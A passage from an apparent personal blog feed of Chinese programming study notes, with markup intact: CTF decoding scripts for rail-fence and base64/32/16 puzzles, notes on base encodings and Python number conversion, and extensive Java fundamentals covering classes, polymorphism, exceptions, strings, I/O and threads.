class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">e = raw_input(<span class="string">'请输入要解密的字符串\n'</span>)</span><br><span class="line">elen = len(e)</span><br><span class="line">field=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</span><br><span class="line">            <span class="keyword">if</span>(elen%i==<span class="number">0</span>):</span><br><span class="line">                field.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</span><br><span class="line">    b = elen / f</span><br><span class="line">    result = &#123;x:<span class="string">''</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</span><br><span class="line">        a = i % b;</span><br><span class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</span><br><span class="line">    d = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</span><br><span class="line">        d = d + result[i]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'分为\t'</span>+str(f)+<span class="string">'\t'</span>+<span class="string">'栏时，解密结果为：  '</span>+d</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/01/28/5c4f1b7e3c791.png" alt="7.png"></p><h2 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下"></a>base全家桶了解一下</h2><p>base加密包括base64,base32,base16，依次解密。附脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">bb64=base64.b64decode(<span class="string">'R1kzRE1RWldHRTNET04yQ0dVM1RNTkpXSU0zREdNWlFHWkNETU5KVklZM1RJTVpRR01ZREtSUldHTTNUS05TRUc0MkRNTVpYR1EzRE1OMkU='</span>)</span><br><span class="line"><span class="comment">#print bb64</span></span><br><span class="line">bb32=base64.b32decode(bb64)</span><br><span class="line"><span class="comment">#print bb32</span></span><br><span class="line">bb16=base64.b16decode(bb32)</span><br><span class="line"><span class="keyword">print</span> bb16</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/01/28/5c4f1b847c4d0.png" alt="8.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到题&lt;/h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf中一些知识总结</title>
    <link href="http://yoursite.com/2019/01/24/%E6%9D%82%E9%A1%B9/"/>
    <id>http://yoursite.com/2019/01/24/杂项/</id>
    <published>2019-01-23T16:00:00.000Z</published>
    <updated>2019-02-01T13:40:08.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式</p><p>base64编码是用64（2的6次方）个字符，对二进制数据进行编码的方式</p><p>base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式</p><p>base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式</p><h1 id="base64和base32和base16"><a href="#base64和base32和base16" class="headerlink" title="base64和base32和base16"></a>base64和base32和base16</h1><p>base64中包含大写字母（A-Z）、小写字母（a-z）、数字0——9以及+/；<br>base32中只有大写字母（A-Z）和数字234567<br>base16中只有数字0-9以及大写字母ABCDEF</p><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>填充<br>base64编码收到一个8bit字节数据，将这个二进制序列每6bit划分一个块。二进制序列有时不能正好平均地分为6位的块，在这种情况下，就在序列末尾填充零位，使二进制序列的长度成为24的倍数(6和8的最小公倍数)。</p><p>6bit里面的数据，全部是填充的，它显示的符号是第65个符号”=”。<br>6bit里面的数据，部分是填充的，按照索引表正常显示</p><p>wait持续更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;p&gt;ASCII 是用128（2的8次方）个字符，对二进制数据进行编码的方式&lt;/p&gt;
&lt;p&gt;base64编码是用64（2的6次方）
      
    
    </summary>
    
      <category term="misc" scheme="http://yoursite.com/categories/misc/"/>
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>python进制转换</title>
    <link href="http://yoursite.com/2019/01/21/python%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>http://yoursite.com/2019/01/21/python密码学/</id>
    <published>2019-01-20T16:00:00.000Z</published>
    <updated>2019-05-19T06:27:35.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>二进制，八进制，十六进制，全是str 类型，而十进制为 Int 类型</p><h2 id="十进制"><a href="#十进制" class="headerlink" title="十进制"></a>十进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int(<span class="string">'0xf'</span>,<span class="number">16</span>) </span><br><span class="line">int(<span class="string">'10100111110'</span>,<span class="number">2</span>)   </span><br><span class="line">int(<span class="string">'17'</span>,<span class="number">8</span>)</span><br></pre></td></tr></table></figure><h2 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hex(<span class="number">1033</span>)</span><br><span class="line">hex(int(<span class="string">'101010'</span>,<span class="number">2</span>))</span><br><span class="line">hex(int(<span class="string">'17'</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin(<span class="number">10</span>)</span><br><span class="line">bin(int(<span class="string">'ff'</span>,<span class="number">16</span>))</span><br><span class="line">bin(int(<span class="string">'17'</span>,<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h2 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oct(<span class="number">0b1010</span>)</span><br><span class="line">oct(<span class="number">11</span>)</span><br><span class="line">oct(<span class="number">0xf</span>)</span><br></pre></td></tr></table></figure><h2 id="整型转字符"><a href="#整型转字符" class="headerlink" title="整型转字符"></a>整型转字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(<span class="number">90</span>)</span><br></pre></td></tr></table></figure><h2 id="字符转整型"><a href="#字符转整型" class="headerlink" title="字符转整型"></a>字符转整型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(<span class="string">'Z'</span>)</span><br></pre></td></tr></table></figure><h2 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zfill(width)  </span><br><span class="line">原字符串右对齐，前面填充<span class="number">0</span>。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;进制转换&quot;&gt;&lt;a href=&quot;#进制转换&quot; class=&quot;headerlink&quot; title=&quot;进制转换&quot;&gt;&lt;/a&gt;进制转换&lt;/h1&gt;&lt;p&gt;二进制，八进制，十六进制，全是str 类型，而十进制为 Int 类型&lt;/p&gt;
&lt;h2 id=&quot;十进制&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="code" scheme="http://yoursite.com/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>java_basis</title>
    <link href="http://yoursite.com/2019/01/10/java%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/01/10/java学习/</id>
    <published>2019-01-09T16:00:00.000Z</published>
    <updated>2019-05-19T06:34:37.139Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Goal: 类似于ant中的target，指完成一定功能的一个任务</span><br><span class="line"></span><br><span class="line">Artifact：项目产生物，主要有jar, war, maven插件</span><br><span class="line"></span><br><span class="line">Plug-in：插件，可复用的功能模块比如，middlegen，statcvs</span><br><span class="line"></span><br><span class="line">POM：项目对象模型(Project Object Model)，是项目的一些关键元信息的集合。主要包含项目管理信息、具体的项目描述、开发小组的构 成、源代码库(如CVS)和邮件列表、项目依赖的库文件(开发时刻依赖和运行时刻依赖)、源代码、单元测试代码和资源文件的位置、项目报告</span><br></pre></td></tr></table></figure><h1 id="GUI编程"><a href="#GUI编程" class="headerlink" title="GUI编程"></a>GUI编程</h1><p>FlowLayout是Panel类的默认布局管理器。<br>BorderLayout是Frame类的默认布局管理器。<br>GridLayout型布局管理器将空间划分成规则的矩形网格，每个单元格区域大小相等。</p><p>四个基本步骤：</p><ol><li>创建与设置组件</li><li>将组件加入到容器</li><li>布局组件</li><li>处理由组件产生的事件</li></ol><h2 id="接口回调和向上转型"><a href="#接口回调和向上转型" class="headerlink" title="接口回调和向上转型"></a>接口回调和向上转型</h2><p>把实现某一接口的类创建的对象的引用赋给该接口声明的接口变量，那么该接口变量就可以调用被调用类实现的接口的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">People</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">peopleList</span><span class="params">()</span></span>; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">People</span> </span>&#123; </span><br><span class="line">    <span class="function">publicvoid <span class="title">peopleList</span><span class="params">()</span> </span>&#123; </span><br><span class="line">       System.out.println(<span class="string">"I’m a student."</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">implements</span> <span class="title">People</span> </span>&#123; </span><br><span class="line">    <span class="function">publicvoid <span class="title">peopleList</span><span class="params">()</span> </span>&#123; </span><br><span class="line">       System.out.println(<span class="string">"I’m a teacher."</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line">publicclass Example &#123; </span><br><span class="line">    <span class="function">publicstaticvoid <span class="title">main</span><span class="params">(String args[])</span> </span>&#123; </span><br><span class="line">       People a; <span class="comment">// 声明接口变量 </span></span><br><span class="line">       a = <span class="keyword">new</span> Student(); <span class="comment">// 实例化，接口变量中存放对象的引用 </span></span><br><span class="line">       a.peopleList(); <span class="comment">// 接口回调 </span></span><br><span class="line">       a = <span class="keyword">new</span> Teacher(); <span class="comment">// 实例化，接口变量中存放对象的引用 </span></span><br><span class="line">       a.peopleList(); <span class="comment">// 接口回调 </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向上转型和向下转型<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;&#125; </span><br><span class="line">  </span><br><span class="line">publicclass A &#123; </span><br><span class="line">    <span class="function">publicstaticvoid <span class="title">main</span><span class="params">(String[] argts)</span></span>&#123; </span><br><span class="line">       A a1=<span class="keyword">new</span> A(); </span><br><span class="line">       A a2=<span class="keyword">new</span> B();<span class="comment">//Upcasting向上转型 </span></span><br><span class="line">       B b1=<span class="keyword">new</span> B(); </span><br><span class="line">       B b2=(B) <span class="keyword">new</span> A();<span class="comment">//DownCasting向下转型,[注意]:此处(B)进行了强制转换! </span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从实现了某接口的对象，得到对此接口的引用，与向上转型为这个对象的基类，实质上效果是一样的。这些对象都可以调用基类型提供的方法，对于接口来说就是回调接口中的方法，对于父类来说就是调用父类的方法。当然在向上转型的情况下，还牵涉到子类重写（Override）父类方法的情形。</p><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><ol><li>创建非静态内部类的对象时一定要确保已经有一个外部类对象。</li><li>创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Outer.Inner1 ib1 = ob.new Inner1(<span class="string">"InnerClass1 Object!"</span>);   <span class="comment">//需要使用外部类对象创建内部类对象</span></span><br><span class="line">Inner2 ib2=<span class="keyword">new</span> Inner2(<span class="string">"InnerClass2 Object!"</span>);   <span class="comment">//静态类可直接创建对象,不需要外部类对象</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="java基本类库1"><a href="#java基本类库1" class="headerlink" title="java基本类库1"></a>java基本类库1</h1><p>java.lang:Java自动import了Java.lang</p><h2 id="三种字符串类"><a href="#三种字符串类" class="headerlink" title="三种字符串类"></a>三种字符串类</h2><p>String,StringBuffer,StringBuilder</p><h2 id="数据类型类"><a href="#数据类型类" class="headerlink" title="数据类型类"></a>数据类型类</h2><p>Boolean,Character,Double,Float,Integer,Long</p><h2 id="Math类"><a href="#Math类" class="headerlink" title="Math类"></a>Math类</h2><p>Integer.parseInt(s);    str-int<br>Integer.toString(i);     int-str</p><p>BigInteger：  任意精度的整数运算<br>BigDecimal：任意精度的浮点数运算</p><p>ceil(double a)  返回大于或等于a的最小整数值<br>floor(double a) 返回小于或等于a的最大整数值<br>rint(double a)  返回四舍五入后的整数值                 （上面三个方法的返回类型均为double型）<br>round(float a)  返回四舍五入后的整数值, 返回int型<br>round(double a) 返回四舍五入后的整数值, 返回long型<br>double c=Math.random(); //得到一个[0,1)之间的随机数</p><p>System.out.println（object）时首先会调用类中的toString()方法。<br>因此重写toSring()方法很关键</p><ol><li><p>java只有按值传递，所谓的按地址(引用)传递，也属于按值传递，只不过这个“值”是个地址;</p></li><li><p>函数的形式参数，是传入参数的拷贝；引用变量之间拷贝的是【地址】，基本变量之间拷贝的是 内存中的值 （被称为直接量）；</p></li><li>3.对象本身，与对象的地址 是2个东西，函数之间如果想【传递对象】，只能通过传递对象的地址来实现</li></ol><p>按值传递不能修改，引用传递可修改。</p><p><strong>对于参数传递，如果是简单数据类型，那么它传递的是值拷贝，对于类的实例它传递的是类的引用。需要注意的是，这条规则只适用于参数传递</strong></p><p># </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="code" scheme="http://yoursite.com/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>java_review</title>
    <link href="http://yoursite.com/2019/01/07/java%E5%A4%8D%E4%B9%A0/"/>
    <id>http://yoursite.com/2019/01/07/java复习/</id>
    <published>2019-01-06T16:00:00.000Z</published>
    <updated>2019-01-08T13:04:51.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><ol><li>局部变量在使用前必须给定初值，否则编译出错<br>类成员变量无此要求  </li><li>final  类型    常量名=值;  </li><li>类静态成员常量只能在定义时初始化  </li><li>正数在计算机中是用二进制表示的，负数在计算机中使用补码表示的</li><li>整数默认是 int 类型，小数默认是 double 类型  </li><li>类常量：成员变量同时被static和final修饰，则它在类的所有对象中都有唯一值，且无法改变。一定要在定义时就给定初始值  </li><li>类方法是对整个类而言的，方法体中不能有与对象有关的内容。一些通用的、公用型的方法与类的对象无关，常被作为类方法实现  </li></ol><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><ol><li></li></ol><ul><li>private 同一个类  </li><li>缺省 同一个类/同一个包  </li><li>protected 同一个类/同一个包/不同包子类  </li><li>public 同一个类/同一个包/不同包子类/不同包非子类  </li></ul><ol><li>每个类至少有一个构造方法，如果没有显式地定义构造方法，Java会自动提供一个缺省的构造方法    </li><li>类方法中不能使用super、this关键字    </li><li>构造方法中，可用this调用另一构造方法    </li><li>Object类是Java中所有类的直接父类或间接父类      </li><li>子类拥有其父类的所有属性和方法（但父类中说明为private的属性和方法，子类不可直接访问），子类可以对父类的方法覆盖或重载    </li><li>被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载     </li><li>静态成员为该类及该类的所有子类所共有      </li><li>如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，  则这两个静态成员变量相互独立    </li><li><p>构造方法不能被继承，子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用。super()必须放在构造方法第一句。     </p></li><li><p>super：代表父类对象，在继承中有重要作用<br>super可以访问直接父类和间接父类的属性和方法<br>super不能在static环境中使用，包括类变量、类方法和static语句块<br>使用super不能访问本类定义的属性和方法<br>在构造方法中使用时，super语句必须放在第一句<br>在子类的构造方法中，super可以不明确使用，也可以明确使用  </p></li><li><p>子类没有明确使用super，系统自动在构造方法中加上super()，调用直接父类的不带参数的构造方法，父类中没有定义不带参数的构造方法，编译会出错。  </p><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>一、使用父类类型的引用指向子类的对象；</p><p>二、该引用只能调用父类中定义的方法和变量；</p><p>三、如果子类中重写了父类中的一个方法，那么在调用这个方法的时候，将会调用子类中的这个方法；（动态连接、动态调用）</p><p>四、变量不能被重写（覆盖），”重写“的概念只针对方法，如果在子类中”重写“了父类中的变量，那么在编译时会报错。</p></li></ol><p>多态的3个必要条件：  </p><pre><code>1.继承   2.重写   3.父类引用指向子类对象。</code></pre><p>访问变量看声明，访问方法看实际对象类型<br>——————————————————————</p><p>向上转型： Person p = new Man() ; //向上转型不需要强制类型转化<br>向下转型： Man man = (Man)new Person() ; //必须强制类型转化  </p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><ul><li>抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象 </li><li>抽象类中可以包含抽象方法，也可以不包含抽象方法 </li><li>如果类中的某一方法是抽象的，整个类就必须被说明成抽象的  </li><li>抽象方法在子类中必须被实现，否则子类仍是抽象的  </li></ul><h1 id="final类"><a href="#final类" class="headerlink" title="final类"></a>final类</h1><p>所有被private修饰符限定，以及所有包含在final类中的方法，都被默认为是final的。因为这些方法不能被子类所继承，所以不能被重载，自然都是最终方法</p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口定义了一些没有实现的方法和静态常量集：  </p><ol><li>接口和类的区别：  </li></ol><ul><li>类只能单继承，而接口可以多继承    </li><li>类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的  </li><li>接口中的方法要用类来实现，一个类可以实现多个接口     </li></ul><ol><li>接口中的成员变量：都是隐含public、static、final的——静态最终变量（常量）   </li><li>接口中的方法都是抽象方法，所有方法隐含public和abstract    </li><li>接口可以作为引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，   </li><li>在设计多态的时候，基础类还可以使用抽象类和接口，可以使程序更清晰，并避免一些容易疏忽的错误。编程者可以自由决定向上转型为一个普通类，一个抽象类或一个接口    </li><li>编译运行带包的java文件 <code>javac -d . test.java</code> <code>java packagename.test</code>    </li></ol><h1 id="变量及其传递"><a href="#变量及其传递" class="headerlink" title="变量及其传递"></a>变量及其传递</h1><p>1.栈：存放所引用对象的堆首地址，称作对象引用值(或对象地址值)<br>2.堆：存放对象中成员变量、方法等内容，称作对象实体值    </p><ul><li><p>按值传递: 当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变   </p></li><li><p>按引用传递: 当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变    </p></li></ul><p>3.Java按值传递所有参数, 制作所有参数的副本, 而不管它们的类型  </p><ol><li><p>对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，不能反映到实参在形参中修改了对象引用。     </p></li><li><p>java程序设计语言对对象采用的不是引用调用，实际上是对象引用进行的是值传递，当然在这里我们可以简单理解为这就是按值调用和引用调用的区别，而且必须明白即使java函数在传递引用数据类型时，也只是拷贝了引用的值罢了，之所以能修改引用数据是因为它们同时指向了一个对象，但这仍然是按值调用而不是引用调用。   </p></li></ol><p>6.==和!=用来比较引用型变量时, 只能判断运算符两边引用的是不是同一个对象, 即对象的地址值（或对象引用值）是不是相同   </p><ol><li>比较两个对象的内容(对象实体值)是否相同用equals()  <h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1>内部类对象的创建: 创建非静态内部类的对象时一定要确保已经有一个外部类对象    </li></ol><p>example: 外部类Goods 内部类 Content,GDestionation<br> Goods g1=new Goods();<br> Goods.Content c1=g1.new Content();<br> Goods.GDestination d1=g1.new GDestionation(“Beijing”));  </p><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><ol><li>异常处理机制：抛出异常——捕捉异常。<br>出现错误，方法都会产生一个异常对象，异常对象将交由运行系统来处理——抛出(throwing)异常。      </li></ol><ul><li>系统抛出。      </li><li>用户自定义抛出。        </li></ul><ol><li>运行系统开始寻找合适的处理方法来处理这个异常。如果系统找到了适合的处理该异常的方法——捕获异常 。     </li><li>编译器强制要求Java程序必须捕获或声明抛出所有非运行时异常  </li><li>throws: 声明抛出异常：不捕获异常，而是将异常交由上一层处理，在其他地方捕获异常  </li></ol><p>5.throw: 一般这种抛出异常的语句应该在满足一定条件执行，例如把throw语句放到if分支中<br>含有throw语句的方法，应该在方法头定义中用throws语句声明所有可能抛出的异常             </p><ol><li><p><img src="https://i.imgur.com/c8oDcK9.png" alt="">   </p></li><li><p>异常在编译时是否被检测区分，异常分运行时异常:如除数为零，错误的强制类型转换、数组越界访问、空引用      </p></li></ol><p>非运行时异常:找不到指定的文件等，不是程序本身的错误     </p><h1 id="基本类"><a href="#基本类" class="headerlink" title="基本类"></a>基本类</h1><h2 id="java-lang"><a href="#java-lang" class="headerlink" title="java.lang"></a>java.lang</h2><p>Object: Java中整个类层次结构的根节点<br>Class:  为运行时搜集的信息<br>Math:  提供数学常数及各种函数<br>System: 提供对操作系统的访问，包括默认的I/O流环境变量、自动垃圾收集、系统时间和系统属性<br>Runtime: 提供了操作系统的访问<br>Thread: 和Runnable接口协同作用提供Java中的多线程的支持<br>Throwable: Java中所有异常(Exception)的基类  </p><p>String类: 不可改变的静态字符串<br>用于代表不变的字符串，并定义了类似查找，比较和连接字符的操作<br>所有字符串常量都是String对象，存储在String Pool（字符串池）中，字符串池是常量池的一部分<br>StringBuffer类: 动态可变的字符串<br>StringBuilder类：动态可变的字符串（≥ jdk1.5）  </p><p>example:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String a=<span class="string">"hellojava"</span>;</span><br><span class="line">String b=<span class="string">"java"</span>;</span><br><span class="line">String c=<span class="string">"hello"</span>+b;</span><br><span class="line"><span class="keyword">if</span>(a==c)&#123;     </span><br><span class="line">    System.out.println(<span class="string">"相等"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;     </span><br><span class="line">    System.out.println(<span class="string">"不等"</span>);          </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>字面量”+”拼接是在编译期间进行的，拼接后的字符串存放在字符串池中；而字符串引用的”+”拼接运算实在运行时进行的，新创建的字符串存放在堆中。     </p><h1 id="java-util"><a href="#java-util" class="headerlink" title="java.util"></a>java.util</h1><p>hashmap&amp;&amp;hashtable<br>哈希表（Hashtable）是一种支持对元素进行快速检索的线性表，主要特征是表中元素的平均检索时间与表中的元素个数无关，因为哈希表是利用“关键字K—元素V”的形式进行存储的列表    </p><p>关键字的值全表唯一，可通过关键字查找到对应的元素。关键字K和元素V的类型不能是基本数据类型， 任何非null 对象都可以用作键或值     </p><h1 id="java-io"><a href="#java-io" class="headerlink" title="java.io"></a>java.io</h1><ol><li>InputStream和OutputStream是所有面向字节的输入输出流的超类    </li><li>Reader和Writer是所有面向字符的输入输出流的超类。   </li><li>FileInputStream和FileOutputStream的数据源都是文件，用于进行文件输入输出的处理 ,FileInputStream:封装了从文件中读取字节的功能,该类是用来读取字节文件的，如图像文件，如果读取字符或者文本文件，则最好使用FileReader类.     </li></ol><p>读数据<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"><span class="comment">//BufferedReader br = new BufferedReader(new FileReader("demo.txt"));</span></span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"wjx.txt"</span>),<span class="string">"gbk"</span>));</span><br><span class="line"><span class="comment">/*方法1*/</span></span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">while</span> ((s = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>写数据<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriterDemo</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">PrintWriter pw = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span>  FileWriter(<span class="string">"demo.txt"</span>)));</span><br><span class="line">pw.println(<span class="string">"This is just a test!"</span>);</span><br><span class="line">pw.println(<span class="string">"hahahhahhh"</span>);</span><br><span class="line">pw.close();</span><br><span class="line">System.out.println(<span class="string">"write ok!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h2 id="多线程-1"><a href="#多线程-1" class="headerlink" title="多线程"></a>多线程</h2><p>两种方法：<br>声明一个 Thread 类的子类，并覆盖 run() 方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 